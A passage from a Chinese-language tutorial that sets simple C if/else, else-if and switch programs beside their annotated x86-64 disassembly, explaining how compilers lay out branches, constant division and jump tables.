不能调换if和else的位置，因为代码的位置不能变，否则某些依赖代码位置的计算会出错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nNumber = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ud&quot;</span>,&amp;nNumber);<br>    <span class="hljs-keyword">if</span>(argc == nNumber)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nNumber / <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nNumber / <span class="hljs-number">5</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> nNumber;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h  <span class="hljs-comment">//对应argc</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h    <span class="hljs-comment">//argv</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main     <span class="hljs-comment">//main函数开始</span><br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>  ; var_a=<span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 lea     rax, [rbp+var_4]    <br>.text:<span class="hljs-number">000000000040156F</span>                 mov     rdx, rax        ; rdx=<span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401572</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%ud&quot;</span><br>.text:<span class="hljs-number">0000000000401579</span>                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">000000000040157</span>E                 mov     edx, [rbp+arg_0]  <span class="hljs-comment">//argc</span><br>.text:<span class="hljs-number">0000000000401581</span>                 mov     eax, [rbp+var_4] <span class="hljs-comment">//var_a=0</span><br>.text:<span class="hljs-number">0000000000401584</span>                 cmp     edx, eax  <span class="hljs-comment">//if(argc==var_a)&#123; var_a=var_a/8;printf(&quot;%d&quot;,); &#125;</span><br>.text:<span class="hljs-number">0000000000401586</span>                 jnz     <span class="hljs-keyword">short</span> loc_40159E<br>.text:<span class="hljs-number">0000000000401588</span>                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=0</span><br>.text:<span class="hljs-number">000000000040158B</span>                 shr     eax, <span class="hljs-number">3</span>          ; /<span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040158</span>E                 mov     edx, eax  <br>.text:<span class="hljs-number">0000000000401590</span>                 lea     rcx, aD         ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401597</span>                 call    <span class="hljs-built_in">printf</span>   <br>.text:<span class="hljs-number">000000000040159</span>C                 jmp     <span class="hljs-keyword">short</span> loc_4015BB<br>.text:<span class="hljs-number">000000000040159</span>E ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040159</span>E<br>.text:<span class="hljs-number">000000000040159</span>E loc_40159E:                             ; CODE XREF: main+<span class="hljs-number">36</span>↑j  <span class="hljs-comment">//else </span><br>.text:<span class="hljs-number">000000000040159</span>E                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=var_a</span><br>.text:<span class="hljs-number">00000000004015</span>A1                 mov     edx, <span class="hljs-number">0</span>CCCCCCCDh<br>.text:<span class="hljs-number">00000000004015</span>A6                 mul     edx   <span class="hljs-comment">//eax * 0CCCCCCCDh</span><br>.text:<span class="hljs-number">00000000004015</span>A8                 mov     eax, edx  <span class="hljs-comment">//</span><br>.text:<span class="hljs-number">00000000004015</span>AA                 shr     eax, <span class="hljs-number">2</span>   <span class="hljs-comment">//eax/4</span><br>.text:<span class="hljs-number">00000000004015</span>AD                 mov     edx, eax<br>.text:<span class="hljs-number">00000000004015</span>AF                 lea     rcx, aD         ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">00000000004015B</span>6                 call    <span class="hljs-built_in">printf</span><br>.text:<span class="hljs-number">00000000004015B</span>B<br>.text:<span class="hljs-number">00000000004015B</span>B loc_4015BB:                             ; CODE XREF: main+<span class="hljs-number">4</span>C↑j<br>.text:<span class="hljs-number">00000000004015B</span>B                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">00000000004015B</span>E                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>C2                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>C3                 retn<br>.text:<span class="hljs-number">00000000004015</span>C3 main            endp<br></code></pre></td></tr></table></figure><h4 id="ifelseifelse结构"><a href="#ifelseifelse结构" class="headerlink" title="ifelseifelse结构"></a>ifelseifelse结构</h4><p>当每个跳转指令的跳转地址之前都紧跟着 jmp指令，并且他们的跳转地址都一样时，可视为一个 多分支结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nVar_4 = <span class="hljs-number">5</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nVar_4);<br><br>  <span class="hljs-comment">// argc == 0 ? 0 : -1</span><br>  <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 0\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">1</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 1\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">2</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 2\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">3</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 3\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;else\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> nVar_4;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span>   <span class="hljs-comment">//</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h  <span class="hljs-comment">//argc</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h  <span class="hljs-comment">//argv</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">5</span>   <span class="hljs-comment">//var_a=5</span><br>.text:<span class="hljs-number">000000000040156B</span>                 lea     rax, [rbp+var_4]  <br>.text:<span class="hljs-number">000000000040156F</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000401572</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401579</span>                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">000000000040157</span>E                 cmp     [rbp+arg_0], <span class="hljs-number">0</span>  <span class="hljs-comment">//argc -0  //if (var_a==0)&#123; pintf(&quot;argc == 0\r&quot;);&#125;</span><br>.text:<span class="hljs-number">0000000000401582</span>                 jnz     <span class="hljs-keyword">short</span> loc_401592<br>.text:<span class="hljs-number">0000000000401584</span>                 lea     rcx, Buffer     ; <span class="hljs-string">&quot;argc == 0\r&quot;</span><br>.text:<span class="hljs-number">000000000040158B</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401590</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015DA  <span class="hljs-comment">//直接结束</span><br>.text:<span class="hljs-number">0000000000401592</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401592</span>  <span class="hljs-comment">//这里可以看到是直接无条件跳转到这里 结束指向同一个 地址loc_4015DA 由于loc_4015BE后才是统一结束判断地址 因为 那里是对应的else语句 因此可以判断使用了 ifelif语句结构</span><br>.text:<span class="hljs-number">0000000000401592</span> loc_401592:                             ; CODE XREF: main+<span class="hljs-number">32</span>↑j  <span class="hljs-comment">//if</span><br>.text:<span class="hljs-number">0000000000401592</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span>  <span class="hljs-comment">//elif (var_a==1)&#123; pintf(&quot;argc == 1\r&quot;);&#125;</span><br>.text:<span class="hljs-number">0000000000401596</span>                 jnz     <span class="hljs-keyword">short</span> h<br>.text:<span class="hljs-number">0000000000401598</span>                 lea     rcx, aArgc1     ; <span class="hljs-string">&quot;argc == 1\r&quot;</span><br>.text:<span class="hljs-number">000000000040159F</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>A4                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015</span>A6 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>A6<br>.text:<span class="hljs-number">00000000004015</span>A6 loc_4015A6:                             ; CODE XREF: main+<span class="hljs-number">46</span>↑j <span class="hljs-comment">//elif (var_a==2)&#123; pintf(&quot;argc == 2\r&quot;);&#125;</span><br>.text:<span class="hljs-number">00000000004015</span>A6                 cmp     [rbp+arg_0], <span class="hljs-number">2</span><br>.text:<span class="hljs-number">00000000004015</span>AA                 jnz     <span class="hljs-keyword">short</span> loc_4015BA<br>.text:<span class="hljs-number">00000000004015</span>AC                 lea     rcx, aArgc2     ; <span class="hljs-string">&quot;argc == 2\r&quot;</span><br>.text:<span class="hljs-number">00000000004015B</span>3                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015B</span>8                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015B</span>A ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015B</span>A<br>.text:<span class="hljs-number">00000000004015B</span>A loc_4015BA:                             ; CODE XREF: main+<span class="hljs-number">5</span>A↑j <span class="hljs-comment">//elif (var_a==3)&#123; pintf(&quot;argc == 3\r&quot;);&#125;</span><br>.text:<span class="hljs-number">00000000004015B</span>A                 cmp     [rbp+arg_0], <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004015B</span>E                 jnz     <span class="hljs-keyword">short</span> loc_4015CE<br>.text:<span class="hljs-number">00000000004015</span>C0                 lea     rcx, aArgc3     ; <span class="hljs-string">&quot;argc == 3\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>C7                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>CC                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015</span>CE ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>CE<br>.text:<span class="hljs-number">00000000004015</span>CE loc_4015CE:                             ; CODE XREF: main+<span class="hljs-number">6</span>E↑j<br>.text:<span class="hljs-number">00000000004015</span>CE                 lea     rcx, aElse      ; <span class="hljs-string">&quot;else\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>D5                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>DA<br>.text:<span class="hljs-number">00000000004015</span>DA loc_4015DA:                             ; CODE XREF: main+<span class="hljs-number">40</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>DA                                         ; main+<span class="hljs-number">54</span>↑j ...<br>.text:<span class="hljs-number">00000000004015</span>DA                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015E1</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015E6</span>                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>ED                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015F</span>2                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015F</span>9                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015F</span>E                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">0000000000401605</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">000000000040160</span>A                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">0000000000401611</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401616</span>                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">0000000000401619</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">000000000040161</span>D                 pop     rbp<br>.text:<span class="hljs-number">000000000040161</span>E                 retn<br>.text:<span class="hljs-number">000000000040161</span>E main            endp<br></code></pre></td></tr></table></figure><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>特点：</p><p>​    特点1: &#x2F;&#x2F; 注意，和elseif不同，内容中没有break的话，编译不会自动加入break（就是jmp 结尾） </p><p>​    特点2: &#x2F;&#x2F; 内容连着写，这是为了符合C语言的语法：case中不写break，会顺着执行下一条case</p><p>​    特点3:&#x2F;&#x2F; 跳转表是从0开始的，因此记录最小值，switch的判断中会让元素减去最小值，再查表。减去最小值的好处：如果输入小于最小值，那么这个输入再减去最小值就会变成负数， 而比较时使用ja，也就是用无符号数判断，那么这个负数就会变成一个很大的数，同样会跳转</p><h4 id="ezswitch小于3"><a href="#ezswitch小于3" class="headerlink" title="ezswitch小于3"></a>ezswitch小于3</h4><p>switch</p><p>当case情况小于等于3时，ifelse和switch并没有什么区别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(argc)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 0\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 1\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 2\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HelloWorld\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><p>&#x2F;&#x2F;下面这里编辑器做了优化 减少了一次跳转 0 1 2  &#x3D;&gt; 1 2 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000401568</span>                 jz      <span class="hljs-keyword">short</span> loc_401584<br>.text:<span class="hljs-number">000000000040156</span>A                 cmp     [rbp+arg_0], <span class="hljs-number">2</span><br>.text:<span class="hljs-number">000000000040156</span>E                 jz      <span class="hljs-keyword">short</span> loc_401592<br>.text:<span class="hljs-number">0000000000401570</span>                 cmp     [rbp+arg_0], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401574</span>                 jnz     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401576</span>                 lea     rcx, Buffer     ; <span class="hljs-string">&quot;case 0&quot;</span><br>.text:<span class="hljs-number">000000000040157</span>D                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401582</span>                 jmp     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401584</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401584</span><br>.text:<span class="hljs-number">0000000000401584</span> loc_401584:                             ; CODE XREF: main+<span class="hljs-number">18</span>↑j<br>.text:<span class="hljs-number">0000000000401584</span>                 lea     rcx, aCase1     ; <span class="hljs-string">&quot;case 1&quot;</span><br>.text:<span class="hljs-number">000000000040158B</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401590</span>                 jmp     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401592</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401592</span><br>.text:<span class="hljs-number">0000000000401592</span> loc_401592:                             ; CODE XREF: main+<span class="hljs-number">1</span>E↑j<br>.text:<span class="hljs-number">0000000000401592</span>                 lea     rcx, aCase2     ; <span class="hljs-string">&quot;case 2&quot;</span><br>.text:<span class="hljs-number">0000000000401599</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">000000000040159</span>E                 nop<br>.text:<span class="hljs-number">000000000040159F</span><br>.text:<span class="hljs-number">000000000040159F</span> loc_40159F:                             ; CODE XREF: main+<span class="hljs-number">24</span>↑j<br>.text:<span class="hljs-number">000000000040159F</span>                                         ; main+<span class="hljs-number">32</span>↑j ...<br>.text:<span class="hljs-number">000000000040159F</span>                 lea     rcx, aHelloworld ; <span class="hljs-string">&quot;HelloWorld&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>A6                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>AB                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">00000000004015B</span>0                 add     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">00000000004015B</span>4                 pop     rbp<br>.text:<span class="hljs-number">00000000004015B</span>5                 retn<br>.text:<span class="hljs-number">00000000004015B</span>5 main            endp<br></code></pre></td></tr></table></figure><h4 id="switch-分支大于4"><a href="#switch-分支大于4" class="headerlink" title="switch 分支大于4"></a>switch 分支大于4</h4><p>注意switch分支大于4之后就有跳转表</p><p>详解在switch7那里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 